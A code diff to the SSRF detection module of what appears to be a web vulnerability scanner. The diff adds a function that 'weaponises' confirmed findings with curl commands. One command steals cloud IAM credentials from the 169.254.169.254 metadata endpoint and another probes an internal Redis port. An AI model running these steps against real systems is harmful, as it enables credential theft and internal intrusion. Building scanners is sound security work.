@@ -16,7 +16,7 @@ from concurrent.futures import ThreadPoolExecutor, as_completed
 from urllib.parse import unquote
 
 from scanner.engine import Finding, Severity, ScanEngine
-from scanner.vulns._common import Injector, is_safe_mode, iter_injectors
+from scanner.vulns._common import Injector, evidence, is_safe_mode, iter_injectors
 
 MODULE = "ssrf_detect"
 
@@ -48,7 +48,24 @@ def _is_url_param(name: str) -> bool:
     return any(h in n for h in _URL_HINTS)
 
 
-def _finding(inj: Injector, payload: str, signal: str) -> Finding:
+def _exploitation_steps(inj: Injector, payload: str) -> list[dict]:
+    """Weaponise a confirmed SSRF: re-fetch the target, steal cloud creds, pivot internally."""
+    if inj.proof is None:
+        return [{"step": 1, "description": "Re-issue the confirmed SSRF payload in this form field.",
+                 "command": f"<inject into {inj.label}>: {payload}"}]
+    creds = "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+    return [
+        {"step": 1, "description": "Re-trigger the SSRF to fetch the confirmed internal/metadata URL.",
+         "command": f'curl -sk "{inj.proof(payload)}"'},
+        {"step": 2, "description": "Steal cloud IAM credentials from the metadata endpoint.",
+         "command": f'curl -sk "{inj.proof(creds)}"'},
+        {"step": 3, "description": "Pivot: probe internal services/ports through the parameter.",
+         "command": f'curl -sk "{inj.proof("http://127.0.0.1:6379/")}"'},
+    ]
+
+
+def _finding(inj: Injector, payload: str, signal: str,
+             proof_lines: list[str] | None = None) -> Finding:
     proof_url = inj.proof(payload) if inj.proof else None
     return Finding(
         module=MODULE,
@@ -61,7 +78,9 @@ def _finding(inj: Injector, payload: str, signal: str) -> Finding:
                         "and non-http(s) schemes, and disable unused URL fetchers. Confirm with an "
                         "out-of-band (OOB) interaction test."),
         raw={"location": inj.label, "parameter": inj.param, "payload": payload,
-             "signal": signal, "proof_url": proof_url, "confidence": "medium"},
+             "signal": signal, "proof_url": proof_url, "confidence": "medium",
+             "evidence": proof_lines or [f"injected into {inj.label}: {payload}"],
+             "exploitation": _exploitation_steps(inj, payload)},
     )
 
 
@@ -83,7 +102,9 @@ def _test(inj: Injector) -> Finding | None:
         if "<html" in low or "<!doctype" in low:
             continue
         if sig_re.search(body):
-            return _finding(inj, payload, signal)
+            return _finding(inj, payload, signal,
+                            evidence(inj, payload, resp,
+                                     indicator=f"server-fetched content present: {signal}"))
     return None
 
 
